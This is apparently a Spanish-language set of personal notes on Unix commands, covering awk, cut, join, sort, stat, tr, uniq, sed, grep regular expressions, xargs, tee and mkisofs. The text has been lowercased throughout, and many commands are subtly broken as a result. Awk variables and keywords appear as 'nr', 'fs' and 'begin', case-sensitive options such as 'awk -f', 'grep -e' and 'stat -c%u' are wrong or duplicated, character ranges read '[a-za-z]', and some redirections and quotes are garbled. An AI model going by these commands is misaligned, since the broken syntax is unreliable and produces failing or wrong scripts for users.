#### variables: como ya hemos dicho, awk dispone de un lenguaje completo, y, como cualquier otro lenguaje, dispone de variables. las variables pueden ser de dos tipos:    * variables predefinidas.    * variables definidas por el usuario. veamos cuales son las variables predefinidas:    * fs (field separator): permite indicar a awk cual es el caracter que separa los campos. por defecto es el espacio. la forma de indicar a awk el caracter de separacion de campos es la siguiente: fs = "caracter". por ejemplo: fs = ",". si hacemos fs = "", estamos indicando a awk que cada caracter es un campo.    * nf (number of fields): contiene el numero total de campos que contiene el registro que se esta leyendo en cada momento.    * rs (record separator): contiene el caracter que indica a awk en que punto del archivo acaba un registro y empieza el siguiente. por defecto es el caracter "\n".  * nr (number of record): contiene el numero de orden del registro que se esta procesando en cada momento. * ofs (OUTPUT fs): la instruccion print inserta en la salida un caracter de separacion cada vez que aparece una coma en el codigo. mediante ofs, podemos indicar a awk que separe los campos mediante el separador que le indiquemos. por ejemplo: ofs = ";" 

#### en cuanto a las variables definidas por el usuario, se crean directamente al hacer referencia a ellas en expresiones. las variables pueden ser:    * escalares: almacenan un solo valor.    * vectoriales: como vectores o arrays. en awk, se pueden crear arrays asociativos, dado que el lenguaje nos permite usar una cadena como indice del array. para referirnos a un elemento dentro de un array, lo haremos: nombre [ subindice ]. campos de entrada en awk se considera cada registro del archivo de entrada como una sucesion de campos delimitados por un caracter dado. este caracter es, por defecto, el espacio. en cualquier caso, podemos indicar a awk que considere otro caracter como separador de campos mediante la opcion fs, tal y como podemos ver en ejemplos anteriores. cada uno de estos campos se numera de forma correlativa, segun su posicion en la linea (o registro), de la siguiente manera: $1, $2, $3, ... ademas, tambien podemos referirnos a la linea entera con $0. por otra parte, se puede forzar a procesar una linea caracter a caracter, dejando la variable "separador de campos" fs sin contenido. si hacemos esto, en $1 se tendra el primer caracter de la linea, en $2 el segundo, etc. el otro dia me encontre con el siguiente ejercicio: awk ####

#### awk puede servirnos muy bien para procesar archivos de texto, extraidos de bases de datos, en los que tenemos registros con campos de datos. como ya hemos dicho, awk dispone de un lenguaje completo, con sentencias, condicionales, bucles, estructuras ... una sentencia que puede sernos de utilidad en el procesamiento de archivos, es el if. veamos un ejemplo usando esta sentencia: ####

awk '{ if (x % 2 == 0) print "x is even"; else print "x is odd" }'

#### imprimir linea n (numero) de un archivo ####

awk 'nr == numero' ruta/a/archivo

#### imprimir bloques de texto con awk ####

awk '/start_pattern/,/stop_pattern/' file.txt   - ejemplo util: awk '/pattern/,/^$/' file.txt

#### buscar archivos con lineas largas en archivos de texto awk ####

awk 'length>200' archivo   - nota: en este ejemplo se busca por una linea mayor o igual a 200 caracteres

#### mostrar pid de una aplicacion haciendo click sobre su ventana con xprop y awk ####

xprop | awk '/pid/ {print $3}'

#### crear un archivo por cada linea extraida de un archivo filtrado con awk ####

awk '{printf "%s\n", $2>$1".seq"}' archivo_a_filtrar.txt

#### remove duplicate lines using awk ####

awk '!($0 in array) { array[$0]; print }' archivo.txt

#### print all lines from /etc/passwd that has the same uid and gid with awk ####

awk -f ':' '$3==$4' passwd.txt

#### print only specific field from a file with awk ####

awk '{print $2,$5;}' employee.txt
 
#### borramos todas las lineas vacias de un archivo con awk ####

awk '!/^$/ {}' archivo.txt

#### mostramos el nombre de usuario y el interprete que usa: ####

awk 'begin {fs=":"}; {print $1,$nf | "sort"}' /etc/passwd

#### mostramos el nombre completo del usuario y su login: ####

awk 'begin {fs=":"}; {print $1,$5 | "sort"}' /etc/passwd

#### extrayendo campos con una posicion fija ####

#### mostrar /etc/passwd de una manera elegante ####

awk 'begin { print "usuario      uid shell\n------------ ---- ----------" } $3 >= 500 { printf "%12s %4d %10s\n", $1, $3, $7 | "sort -r"}' fs=":" /etc/passwd

awk 'begin { print "usuario      uid shell\n------------ ---- ----------" } $3 >= 500 { printf "%-12s %4d %-10s\n", $1, $3, $7 | "sort -r"}' fs=":" /etc/passwd

#### extrayendo campos sin posicion fija ####

uptime | gawk '{print $(nf - 2), $(nf - 1), $nf}'

uptime | gawk '{print "1min:"$(nf - 2), "5min:"$(nf - 1), "15min:"$nf}'   - agregandole minutos como informacion adicional

#### awk tambien es util por si queremos ver archivos de configuracion en los que queremos ver una seccion en particular por ejemplo ####

awk '/listen {/,/}/' /etc/freeradius/radiusd.conf

#### convertir archivo de texto codificacion mac a unix ####

awk '{ gsub("\r", "\n"); print $0;}' macfile.txt > unixfile.txt

#### convertir archivo de texto codificacion unix a mac ####

awk '{ gsub("\n, "\r"); print $0;}' unixfile.txt > macfile.txt


#############################################################################################################################################################################################

############################################################################################# cut ###########################################################################################

#### cut

#### cut el comando cut nos permite buscar y/o seleccionar columnas o campos dentro de un archivo estructurado. en el caso de los campos, los archivos deben estar estructurados y entre campo y campo debe existir obligatoriamente un delimitador. este delimitador puede ser: los dos puntos (:), el tabulador, espacio en blanco, u otro caracter. cut ####

#### para seleccionar un campo dentro de un archivo debemos especificar el numero de campo despues del parametro: cut ####

cut -f numerodecampo archivo

#### por defecto, el delimitador es el tabulador. si utilizamos otro delimitador, lo indicaremos mediante el parametro -d . por ejemplo: cut ####

cut -f numerodecampo/s -d "delimitador" archivo

#### si trabajamos con columnas nos encontramos como primera referencia que tenemos campos de longitud fija, mientras que con los campos estos pueden ser de longitud variable. el numero de cada columna hace referencia a su posicion dentro de la linea. indicamos las columnas con el parametro -c numero de columna y archivo. por ejemplo: cut ####

cut -c22-34 archivo



#############################################################################################################################################################################################

############################################################################################# join ##########################################################################################

#### join

#### join un comando que nos puede resultar bastante util para mezclar informacion obtenida de dos archivos relacionados es el comando join. join se utiliza para crear un archivo mezclando otros dos que tienen un campo clave con informacion comun. por defecto, no tenemos que indicar ese primer campo comun, pero podemos indicar otro campo distinto. para poder mezclar la informacion de ambos archivos, los campos deben estar separados por un caracter, que por defecto es el espacio o tabulador. ejemplo: ####

join archivo1 archivo2 

#### los espacios iniciales se ignoran. si deseamos especificar un separador de campo especifico, lo hacemos con el parametro -t. veamos un ejemplo en el que utilizamos como separador de campos los dos puntos: ####

join -t":" profesores.txt grupos.txt

#### pero imaginemos que el campo por el que queremos mezclar los archivos no es el primero en ambos archivos. pues bien, podemos indicar el numero de campo por el que queremos hacer la mezcla en cualquiera de los archivos, en el ejemplo estamos indicando que la mezcla se debe realizar tomando el primer campo del primer archivo con el segundo campo del segundo archivo ####

join -t":" -2 2 profesores.txt grupos.txt

#### tambien podriamos indicar los campos de cada archivo por los que se debe mezclar. en este caso, mezclamos tomando como referencia el segundo campo del primer archivo con el segundo campo del segundo archivo ####

join -t":" -1 2 -2 2 profesores.txt grupos.txt

#### nota: un detalle importante a destacar: los archivos deben estar ordenados por el campo que se van a mezclar. ####



#############################################################################################################################################################################################

########################################################################################### paste ###########################################################################################

#### paste

#### el comando paste crear columnas verticales del contenido en los archivos de entrada especificados ####




#############################################################################################################################################################################################

############################################################################################ let ############################################################################################

#### let

#### let el comando let nos permite trabajar facilmente con variables numericas en scripts. por ejemplo: supongamos que queremos multiplicar por 2 el valor de una variable y almacenar el resultado en otra: ####

simple = 4
let doble = simple*2

#### si despues de ejecutar estas dos instrucciones en un terminal, hacemos un: ####

echo $doble

#### veremos que la variable doble vale 8. ####

#### un ejemplo completo: hacer un bucle while que incremente el valor de una variable contador y vaya mostrando los valores que toma dicha variable: ####

#!/bin/bash

contador=0
max=20

while [ $contador -lt $max ]; do
let contador=contador+1
echo el contador es $contador

done

#############################################################################################################################################################################################

############################################################################################# sort ##########################################################################################

#### sort

#### sort es uno de los comandos que utilizamos mucho a la hora de realizar scripts. nos permite ordenar los registros o lineas de uno o mas archivos. la ordenacion se puede hacer por el primer caracter, por el primer campo de la linea o por un campo distinto al primero en el caso de archivos estructurados. veamos una lista de los parametros que pueden resultarnos mas utiles a la hora de usar este comando: ####

-f : este parametro nos sirve para indicar que las mayusculas y las minusculas se van a tratar de forma diferente y que por tanto se va a seguir un ordenamiento alfabetico.
-n : este parametro nos sirve para ordenar los campos numericos por su valor numerico.
-r : nos permite realizar una ordenacion inversa, es decir, de mayor a menor.
+numero : este parametro nos sirve para indicar la columna o campo por el que vamos hacer la ordenacion. esta sintaxis esta en desuso y se va a eliminar. en su lugar se utilizara la siguiente sintaxis:
-k numero : de este modo especificaremos por que columna o campo vamos a realizar la ordenacion en las versiones mas recientes de linux.
--field-separator= separador. normalmente, se usa como delimitador de campos el espacio en blanco. podemos utilizar el parametro --field-separator para indicar que vamos a usar otro delimitador de campo cualquiera. ej: --field-separator=, la opcion abreviada de --field-separator es -t.
-u : nos permite suprimir todas las lineas repetidas despues de realizar la ordenacion.

#### y algunos ejemplos con dichos parametros son: ####

#### podemos ordenar el contenido de un archivo de la siguiente manera: ####

sort archivo

#### se realizaria la ordenacion y el resultado se mostraria por pantalla. asi que, si lo que queremos es obtener el resultado de la ordenacion en un archivo, hariamos: ####

sort archivo > archivoordenado

#### si lo que queremos es ordenar varios archivos y anadir el resultado a otro, podemos indicar varios archivos en la linea de entrada: ####

sort archivo1 archivo2 > archivo3

#### y si lo que queremos es ordenar un archivo y dejar el resultado de la ordenacion en el mismo archivo, podemos hacerlo con el parametro -o (OUTPUT): ####

sort -o f1 f1

#### obtener un listado de los archivos del directorio actual, ordenado por tamano de archivo: ####

ls -l | sort -k 5 -n

#### obtener un listado de los archivos del directorio actual, ordenado de mayor a menor por tamano de archivo: ####

ls -l | sort -r -k 5 -n

#### obtener un listado de los archivos del directorio actual, ordenado por nombre del archivo: ####

ls -l | sort -k 8

#### ordenar un archivo eliminando las lineas repetidas: ####

sort -u archivo

#### ordenar un archivo en el que los campos estan separados por comas, por el campo numero 3: ####

sort -t "," -k 3

#### veamos un ejemplo en el que ordenemos usando la sintaxis actual para ordenar por columnas: imaginemos que queremos ver un listado de usuarios del archivo /etc/passwd ordenado por uid: ####

cat /etc/passwd | sort -t ":" -k 3 -n

#### con -k3 le indicamos a sort que queremos ordenar por la columna 3. y, al anadir la opcion -n le indicamos que ordene por orden numerico. ####

#### un ejemplo que uso mucho, cuando quiero eliminar las lineas repetidas de un archivo y dejar el contenido en el mismo archivo: ####

sort -o archivo -u archivo

#### sort a file in ascending order ####

sort names.txt

#### sort a file in descending order ####

sort -r names.txt

#### sort passwd file by 3rd field ####

sort -t: -k 3n /etc/passwd | more



#############################################################################################################################################################################################

############################################################################################ stat ###########################################################################################

#### stat

#### stat el comando stat nos muestra una informacion muy completa acerca de archivos o sistemas de archivos. como todos los comandos, tiene muchas opciones, asi que pondre solo las que mas he usado. para consultar el resto, podeis usar el man. veamos una salida de ejemplo, cuando ejecutamos stat pasandole como parametro un archivo: ####

stat comprime.sh

file: `comprime.sh'
size: 262 blocks: 8 io block: 4096 archivo regular
device: 804h/2052d inode: 1785294 links: 1
access: (0644/-rw-r--r--) uid: ( 1000/enam0000) gid: ( 100/ users)
access: 2008-04-03 18:45:29.000000000 +0200
modify: 2008-01-30 17:56:08.000000000 +0100
change: 2008-03-04 23:32:02.000000000 +0100

#### la informacion es completa: este comando nos reporta el nombre del archivo, su tamano, los bloques que ocupa, el tipo de archivo (regular), informacion fisica de donde se encuentra (dispositivo/inode), los permisos estandar, los duenos del archivo y las tres marcas de tiempo unix. ####

#### y si lo que queremos hacer es obtener tan solo un dato concreto, podemos hacerlo de la siguiente manera: ####

stat -c%u archivo    nos muestra el user id del propietario del archivo.

stat -c%u archivo    nos muestra el nombre de usuario del propietario del archivo.

stat -c%g archivo    nos muestra el group id del propietario del archivo.

stat -c%g archivo    nos muestra el nombre del grupo al que pertenece propietario del archivo.

stat -c%n archivo    nos muestra el nombre del archivo.

stat -c%f archivo    nos muestra el tipo del archivo.

stat -c%a archivo    nos muestra los derechos de acceso.

stat -c%a archivo    nos muestra los derechos de acceso en formato octal.

stat -c%x archivo    nos muestra la fecha y hora del ultimo acceso.

stat -c%y archivo    nos muestra la fecha y hora de la ultima modificacion.


# To display all files in the current working directory followed by the access rights in octal form, type: #

stat -c '%n %a' *

stat -c '%n %A' *


# To view the file type in the output, you can add %F format sequence #

stat -c '%c %F %a'


#############################################################################################################################################################################################

############################################################################################## tr ###########################################################################################

#### tr

#### tr es un comando para traducir o borrar caracteres tambien es un filtro que nos permite cambiar una determinada informacion de un archivo por otra. cambia cada uno de los caracteres especificados en el conjunto inicial por los caracteres especificados en el conjunto final. el archivo de origen o archivo destino lo especificamos con los caracteres de redireccion: < o >. ####

#### veamos un par de ejemplos o tres: ####

tr ':' ' ' < /etc/passwd > archivopasswd
tr '[a-z]' '[a-z]' < archivo_entrada_mayusculas.txt > archivo_salida_minusculas.txt
tr ' ' '\n' <> lineasusuarios
tr -s " " <> prueba2

#### parametros utiles: ####

#### -s : sustituye un conjunto de caracteres repetidos por uno solo. es muy util cuando hay secuencias de caracteres que queremos borrar: ####

tr -s " " <> archivodestino

#### -c : hace que se traduzcan todos los caracteres que no se encuentren especificados en el primer parametro. en el siguiente ejemplo se traduce por una ? todo lo que no sean letras o numeros. ####

tr -c '[a-z][a-z][0-9]' ? <> archivodestino

#### -d : borra los caracteres que especifiquemos. ####

tr -d '[a-z][0-9]' ? <> archivodestino

#### otro ejemplo practico que uso en ocasiones cuando quiero conseguir una lista, convirtiendo los caracteres de nueva linea en espacios: ####

tr '\n' ' ' < /etc/pkgsync/musthave > listaenunasolalinea

#### hay una manera para convertir un archivo con finales de lineas de dos (crlf) a finales de linea unix: ####

tr -d '\015' < $file.dos > $file.unix

#### esto convierte los multiples espacios en uno ####

ls -l | tr -s ' '

#### convertir archivo de textos codicacion mac a unix ####

tr '\r' '\n' < macfile.txt > unixfile.txt

#### convertir archivos de texto codificacion unix a mac ####

tr '\n' '\r' < unixfile.txt > macfile.txt

#############################################################################################################################################################################################

############################################################################################# uniq ##########################################################################################

#### uniq

#### uniq es uno de los filtros que nos sirve para filtrar o eliminar las lineas repetidas con los que trabajamos bastante. podemos darle varios usos. el principal es eliminar lineas repetidas, tal y como hace el paramero -u del comando sort. ####

#### para visualizar lineas no repetidas no tenemos que indicar ningun parametro, aunque podemos pasarle el parametro -u. ####

uniq -u archivo.txt

#### tambien podemos usar el parametro -d para visualizar las lineas repetidas. ####

uniq -d archivo.txt

#### tambien podemos utilizarlo para contar lineas repetidas, pasandole el parametro -c. ####

uniq -c archivo.txt

#### con el parametro "-i" le decimos uniq que ignore la diferencia entre mayusculas y minusculas ####

uniq -ci archivo.txt



#############################################################################################################################################################################################

########################################################################################### which ###########################################################################################

#### which

#### which el comando which nos sirve para averiguar donde se encuentra instalado un determinado programa. para realizar la busqueda which localiza los archivos ejecutables mediante el path. Esto puede sernos util, por ejemplo, para comprobar si tenemos dos versiones de un mismo programa instalado en diferentes directorios. por ejemplo, si ejecutamos: ####

which find

#### nos devolvera: ####

/usr/bin/find

#### Esto nos mostrara la primera aparicion del programa buscado. si queremos que nos muestre todas las ocurrencias que encuentre, utilizaremos el parametro -a. asi, si ejecutamos: ####

which -a find

#### nos devolvera todas las ocurrencias que encuentre: ####
/usr/bin/find
/usr/bin/x11/find



#############################################################################################################################################################################################

############################################################################ regexp expresiones regulares regexp tuberias ###################################################################

#### regexp #### tuberias

#### regexp es una expresion regular es un patron que nos permite buscar un texto formado por metacaracteres y caracteres ordinarios. los metacaracteres son ciertos caracteres con un significado especifico dentro de una expresion regular. estos caracteres tienen un significado que va mas alla del simbolo que representan y tienen un comportamiento especial en una expresion regular. ####

#### aqui teneis una lista de metacaracteres que usamos en expresiones regulares: ####

.      significa cualquier caracter.
^      indica el principio de una linea.
$      indica el final de una linea.
*      indica cero o mas repeticiones del caracter anterior.
+      indica una o mas repeticiones del caracter anterior.
\<     indica el comienzo de una palabra.
\>     indica el final de una palabra.
\      caracter de escape. da significado literal a un metacaracter.
[ ]    uno cualquiera de los caracteres entre los corchetes. ej: [a-z] (desde a hasta z).
[^ ]   cualquier caracter distinto de los que figuran entre corchetes: ej: [^a-z].
{ }    nos permiten indicar el numero de repeticiones del patron anterior que deben darse.
|      nos permite indicar caracteres alternativos: ej: (^|[?&])
( )    nos permiten agrupar patrones. ej: ([0-9a-f]+:)+
?      significa cualquier caracter en la ubicacion exacta


#### expresiones entre corchetes: ####

b[aeiou]g       equivale  a         bag beg big bog bug

#### expresiones en un rango: ####

a[2-4]z         equivale a          a2z a3z a4z

#### cualquier caracter unico: ####

a.z             equivale a          a2z, abz, aqz,  "." es cualquier caracter

#### comienzo de linea (^): ####

^#              busca archivos que empiecen con #

#### final de una linea ($): ####

@a              busca archivos que acaben en "a"

#### operador de repeticion: ####

(*)             cero o mas coincidencias

(+)             una o mas coincidencias

(?)             cero o una coincidencia

#### varias posibles cadenas ####

|               prueba | ejemplo, cosas que coindan con prueba y ejemplo

#### caracteres de escape, util cuando se quiere comparar algo con caracteres especiales y que no lo interprete el shell, se "escapa" ####

\               caracter de escape


#### ojo. en las expresiones regulares se distingue entre mayusculas y minusculas. ####

#### si queremos representar un caracter entre la a y la z, lo haremos de la siguiente manera: [a-z]  dentro del conjunto, podemos especificar todos los caracteres que queramos. por ejemplo: [a-za-z] representaria los  caracteres alfabeticos en minusculas y mayusculas. eso si. el conjunto representa a un solo caracter.  si lo que queremos es representar identificar un numero o una letra, podriamos hacerlo asi: [a-za-z0-9] ####

#### los conjuntos pueden representarse, nombrando todos y cada uno de los elementos, o el intervalo. ej: [0-9] representa lo mismo que [0123456789]. ####

#### si queremos representar un numero que se compone de cero o mas digitos: [0-9]* ####

#### y si queremos representar un numero que se compone de uno o mas digitos: [0-9]+ ####

#### si ahora queremos representar cualquier caracter menos los digitos: [^0-9] ####

#### ahora, imaginemos que queremos representar un numero de 5 digitos: [0-9]{5} ####

#### y si quisieramos representar una palabra que tiene entre dos y cuatro caracteres: [a-za-z]{2,4} ####

#### dentro de los conjuntos de caracteres individuales, se reconocen las siguientes categorias: ####

#### el signo de interrogaccion se expande a un unico caracter y en la posicion exacta ####

#### redireccionamientos ####

#### un proceso es un programa en ejecucion. se utilizan por lo menos tres archivos que describen los archivos abiertos a los cuales accede el proceso. 0 corresponde a la entrada, 1 a la salida, y 2 al error. ####

#### la entrada estandar es el teclado, la salida estandar aparece por pantalla, mientras que el error a pesar de salir tambien por pantalla, va por un canal distinto. ####


#### redireccionamiento de salida ####

ls /usr/bin/k* > kbinarios    -   wc -l kbinarios    =    352 kbinarios

#### redireccionamiento de error ####

find / -type p 2> errores

#### redireccionamiento de error y salida a distintos archivos ####

find / -type p 2> errores 1> tuberias

#### redireccionamiento de error y salida al mismo archivo ####

find / -type p > allinone 2>&1

#### redirecciomiento destructivo y aditivo ####

echo hola > saludo   -   cat saludo   =   hola

echo chau  > saludo   -   cat saludo   =   chau

echo hola >> saludo   -   cat saludo =   chau hola

#### tuberias (pipes) ####

#### una tuberia es el metodo que consiste en enviar la salida estandar de un proceso a la entrada estandar de otro. en esencia, la salida del programa es modificada o usada por medio de otro. en la mayoria de las shells, esto se hace poniendo al caracter "|" (sin las comillas) entre los comandos ####

#### las tuberias permiten capacidades de procesamiento de texto eficiente con las que unix y los sistemas similares fueron disenados, entre otras capacidades ####

#### un ejemplo es usar la salida de dmesg como entrada para grep para mostrar solamente las lineas que contienen una cadena de texto determinada ####

#### dmesg | grep ext4

#### comandos utiles para ejecutar luego de tuberias ####

* cat: para volcar archivos
* nl: para enumerar lineas
* wc: para contar palabras
* grep: para busca expresiones regulares por lineas
* ppt: para convertirla en entrada para una ticker tape
* netpbm: para trabajar con imagenes
* sed y awk: para procesar textos
* xargs: para usar la entrada como argumentos para un comando en lugar de la salida estandar

[:alnum:]   alfanumericos
[:alpha:]   alfabeticos
[:cntrl:]   de control
[:digit:]   digitos
[:graph:]   graficos
[:lower:]   minusculas
[:print:]   imprimibles
[:punct:]   de puntuacion
[:space:]   espacios
[:upper:]   mayusculas
[:xdigit:]  digitos hexadecimales

#### vamos a ver algunos ejemplos de expresiones regulares: ####

#### el comando nos devuelve todas las lineas del archivo que comienzan por la. ####

grep '^la' archivo

#### el comando nos devuelve todas las lineas del archivo que comienzan por cualquier numero de espacios seguido de la. ####

grep '^ *la' archivo

#### el comando nos devuelve todas las lineas del archivo que comienzan por punto y tienen cualquier numero de caracteres. ####

grep '^\..*' archivo

#### el comando nos devuelve la lista de archivos que comienzan por un espacio seguido de un punto y cualquier numero de caracteres, es decir, la lista de archivos ocultos. ####

ls -la | grep ' \..*'

#### el comando nos devuelve la lista de archivos que comienzan por d, es decir, la lista de directorios. ####

ls -l | grep '^d'


#### encontrar frases que tengan exactamente 6 palabras dentro de un archivo de texto ####

grep -e '^([a-za-z]+[^a-za-z]+){6}$' archivo.txt   - nota: el parametro -e porque queremos usar expresiones regulares extendidas para que funcione el "+". si usamos las expresiones regulares basicas, habria que escapar los parentesis y las llaves ####

#### referencias hacia atras o backreferences,  ####

grep '^\(.\)\(.\)\(.\).\3\2\1$' /usr/share/dict/words   - nota: esta expresion regular funciona de la siguiente manera: aparte del "^" y el "$", que ya sabemos para que sirve, lo primero que vemos a la izquierda son tres grupos de puntos encerrados entre parentesis. que no os confundan las barras que hay delante de cada parentesis. son para escapar los parentesis porque estamos usando expresiones regulares basicas, pero no tienen ningun otro significado. lo importante es que estamos pidiendo con los puntos tres caracteres cualesquiera, pero cada uno de esos puntos estan encerrados entre parentesis. esto sirve para que guarde los caracteres que encajan con esos puntos de manera que se pueda volver a hacer referencia a ellos desde la expresion regular. este es otro uso de los parentesis que sera muy util mas adelante para hacer reemplazos. aqui es donde vienen los tres numeros que hay a continuacion con la barra delante. en este caso, la barra si es importante. sirve para indicar que el numero que hay a continuacion es una backreference y esta haciendo referencia a uno de los parentesis anteriores. por ejemplo: \1 hace referencia al primer parentesis, \2 al segundo y asi sucesivamente. o sea que con la expresion regular que hemos puesto, lo que buscamos son todas las palabras que empiecen por cuatro letras cualesquiera y luego tengan una letra que sea igual que la tercera, otra que sea igual que la segunda y otra que sea igual que la primera. el resultado son los palindromos de siete letras que esten en la lista de palabras. tal como queriamos. si estuvieramos usando expresiones regulares extendidas, no habria que escapar los parentesis, pero con expresiones regulares extendidas no funcionan las backreferences en todos los programas porque no estan estandarizadas. sin embargo, con grep funcionan, o sea que esa puede ser otra forma de hacer lo mismo. podeis probarlo si quereis.

#### ver archivos de configuracion sin borrando los comentarios ####

sed 's/#.*//g' /etc/fstab   - nota: en este comando la expresion de busqueda es "#.*", o sea un "#" seguido de cualquier numero de caracteres, o sea, los comentarios. y la expresion de reemplazo, si os fijais en las dos barras seguidas, vereis que no hay ninguna, asi que lo que esta haciendo es reemplazar los comentarios por nada, o sea, borrarlos. mas sencillo imposible

#### comentar todas las lineas de un archivo ####

sed 's/^/#/g' /etc/fstab

#### backreference con sed ####

sed 's/\([a-z]\)/(\1)/g' frases   - nota: lo que tenemos aqui es una backreference en la expresion de reemplazo que hace referencia al parentesis que hay en la expresion de busqueda. los parentesis que hay en la expresion de reemplazo son parentesis normales. en la expresion de reemplazo no tienen ningun significado especial, se ponen tal cual. el resultado es que todas las letras mayusculas se reemplazan por esa misma letra, sea cual sea, con parentesis alrededor.

#### si usamos "&" en la expresion de reemplazo y se reemplaza por todo el texto filtrado por la expresion de busqueda. un ejemplo meter todas las frases del archivo entre comillas ####

sed 's/.*/"&"/g' frases


#### comandos utilies utilizando expresiones regulares ####

#### mostrar las secciones de una pagina del manual filtrando por palabras que esten en mayusculas desde el comienzo de la palabra hasta su final ####

man bash | grep '^[A-Z][A-Z ]*$'   - nota: por supuesto, podeis cambiar el comando bash por el que querais. y luego desde man, podeis ir directamente a la seccion que os interesa usando, como no, una expresion regular. pulsais "/" para empezar a buscar y escribis "^aliases$" para ir a la seccion aliases

#### mostrar los nombres de todos los usuarios de la maquina incluidos los especiales ####

sed 's/\([^:]*\).*/\1/' /etc/passwd

#### mostrar los nombres de los usuarios, pero solo los que tienen shell ####

grep -ve '(/false|/nologin)$' /etc/passwd | sed 's/\([^:]*\).*/\1/g'

#### insertar una coma delante de las tres ultimas cifras de todos los numeros que haya en el archivo numbers ####

sed 's/\(^\|[^0-9.]\)\([0-9]\+\)\([0-9]\{3\}\)/\1\2,\3/g' numbers   - nota: solo funciona con numeros de hasta 6 digitos, pero se puede lanzar mas de una vez para colocar separadores en los demas grupos de tres cifras

#### extraer todas las direcciones de email de un archivo ####

grep -e '\<[a-za-z0-9._%+-]+@[a-za-z0-9.-]+\.[a-za-z]{2,4}\>' archivo

grep -e -o "\b[a-za-z0-9.-]+@[a-za-z0-9.-]+\.[a-za-z0-9.-]+\b"

egrep -o "\b[a-za-z0-9.-]+@[a-za-z0-9.-]+\.[a-za-z0-9.-]+\b" archivo.txt

#### separar el dia, mes y ano de todas las fechas que aparezcan en un archivo ####

sed -r 's/([0-9]{2})[/-]([0-9]{2})[/-]([0-9]{4})/dia: \1, mes: \2, ano: \3/g' archivo



###################################################################################### regexp file globing ##################################################################################

#### expresiones regulares file globing

####  las expresiones regulares permiten el reemplazo de patrones en lugar de cadenas. sed usa la sintaxis estandar de expresiones regulares [-]*^. ####

#### por ejemplo sed -e 's/[0-9]*//g' borrara todos los numeros de la salida ####


caracter 	descripcion

^ 	        comienzo de la linea
$ 	        final de la linea
. 	        un caracter cualquiera
* 	        cero o mas ocurrencias del caracter previo
[ ] 	        todos los caracteres entre los corchetes

ejemplos simples de reemplazo:

/./  	        apuntara a cualquier linea que contenga al menos un caracter
/../ 	        apuntara a cualquier linea que contenga al menos dos caracteres
/^#/ 	        apuntara a cualquier linea que comience con un '#'
/^$/ 	        apuntara a cualquier linea en blanco
/}^/ 	        apuntara a toda linea que termine con un '}' (sin espacios)
/} *^/ 	        apuntara a toda linea que termine con un '}' con cero o mas espacios
/[abc]/ 	apuntara a toda linea que contenga una 'a', 'b', o 'c' minuscula
/^[abc]/ 	apuntara a cualquier linea que empiece con 'a', 'b', o 'c'

clases de caracteres que se pueden encontrar:

[:alnum:]  	alfanumerico [a-z a-z 0-9]
[:alpha:] 	alfabetico [a-z a-z]
[:blank:] 	espacios o tabuladores
[:cntrl:] 	cualquier caracter de control
[:digit:] 	digitos numericos [0-9]
[:graph:] 	cualquier caracter visible (no espacios en blanco)
[:lower:] 	minusculas [a-z]
[:print:] 	caracteres que no sean de control
[:punct:] 	caracteres de puntuacion
[:space:] 	espacio en blanco
[:upper:] 	mayusculas [a-z]
[:xdigit:] 	digitos hexadecimales [0-9 a-f a-f]



#############################################################################################################################################################################################

############################################################################################# xarg ##########################################################################################

#### xarg

#### xarg nos puede servir para usar la entrada como argumentos para un comando en lugar de la salida estandar ####

#### el comando xargs permite ejecutar un programa con muchos, muchos argumentos. si hay demasiados argumentos, xargs los dividira en multiples listas. es particularmente util con el comando find, de manera que se incluye en las herramientas de busqueda gnu. en este ejemplo, se podria usar el comando "-exec" de find. pero, si hay 100000, find -exec ejecutara rm 100000 veces, mientras que find | xargs solamente ejecutara rm quiza cuatro veces ####

find -name "*~" | xargs rm



#############################################################################################################################################################################################

############################################################################################# tee ###########################################################################################

#### tee

#### tee nos es util para hacer bifurcaciones de las salidas de los comandos

#### ejemplo rapido de como imprimir la salida de un comando a un archivo. ejecutar el siguiente comando para obtener un listado de directorio en la terminal, mientras tambien se redirige la salida a un archivo llamado terminal.out ####

ls -al | tee terminal.out    -    cat terminal.out

#### en este ejemplo parece como si la salida de ls se hubiese bifurcado: por un lado hacia el comando tee y por el otro hacia wc ####

ls -a /sbin  | tee sbin | wc -l   = 375

#### los comandos mas relevantes relacionados a tee son: ####

* tpipe
* tee-pipe
* script
* lsof



#############################################################################################################################################################################################

############################################################################################# expand ########################################################################################

#### expand

#### expand es util para reemplaza los tabuladores por espacios en archivos de texto. tambien se puede usar la entrada estandar en vez de un archivo ####




#############################################################################################################################################################################################

############################################################################################ unexpand #######################################################################################

#### unexpand

#### el comando unexpand reemplaza los espacios en los archivos de texto creados con expand de vuelta a caracteres de tabulacion



#############################################################################################################################################################################################

############################################################################################## fmt ##########################################################################################

#### fmt

#### fmt sirve para cambiar el formato de cada parrafo intentando que todas las lineas terminen en la misma columa ####



#############################################################################################################################################################################################

################################################################################ random funcion interna de bash #############################################################################

#### random

#### random $random es una funcion interna de bash que devuelve un numero entero pseudoaleatorio en el rango: 0 - 32767. ####

#### podemos acotar los limites superior e inferior del numero a generar de la siguiente manera: ####

si queremos establecer un limite superior, utilizaremos la funcion modulo (%).
si queremos establecer un limite superior, sumamos el numero inferior.

#### como esto es mas dificil de explicar que de hacer, veamoslo con ejemplos: ####

#### si queremos obtener un numero entre 0 y 15 usamos el comando: ####

echo $((random%16))

#### si queremos obtener un numero entre 1 y 15: ####

echo $((1+random%15))



#############################################################################################################################################################################################

########################################################################################### mkisofs #########################################################################################

#### mkisofs

#### podemos crear un iso de un directorio utilizando el programa mkisofs. de la siguiente manera: ####

mkisofs -o archivo.iso /directorio

#### y si queremos crear el iso de un directorio que arranque con grub, anadiremos un directorio /boot al directorio de la imagen con un grub y el archivo stage2_eltorito dentro de boot/grub/. ####

#### si tenemos debian y un kernel de 64 bits, encontraremos el archivo stage2_eltorito en el directorio: ####

/usr/lib/grub/x86_64-pc/

#### y si nuestro kernel es de 32 bits, el archivo estara en: ####

/usr/lib/grub/i386-pc/

#### una vez listo el directorio del que vayamos a crear el archivo iso, ejecutaremos el comando mkisofs. ####

#### veamos un ejemplo: imaginemos que tenemos un directorio llamado "cd", a partir del que vamos a crear un iso llamado cd_boot.iso con una etiqueta de disco "etiqueta": ####

mkisofs -v etiqueta -no-iso-translate -u -nobak -r -b boot/grub/stage2_eltorito -no-emul-boot -boot-load-size 4 -boot-info-table -o cd_boot.iso cd

#### para rematar, una vez creado el archivo iso, podemos crear su hash md5. de este modo, si alguien quiere descargarlo, podra comprobar que la descarga es correcta y el archivo no ha sido manipulado: ####

md5sum archivo.iso > archivo.iso.md5 

